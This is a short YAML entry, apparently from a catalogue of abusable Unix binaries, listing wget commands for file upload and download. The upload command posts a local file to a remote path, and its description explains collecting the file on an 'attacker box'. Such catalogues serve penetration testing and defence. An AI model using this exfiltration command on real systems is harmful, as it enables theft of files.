---
functions:
  file-upload:
    - description: Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data.
      code: |
        wget --post-file=$LFILE $RPATH
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        wget $RPATH -O $NFILE
---
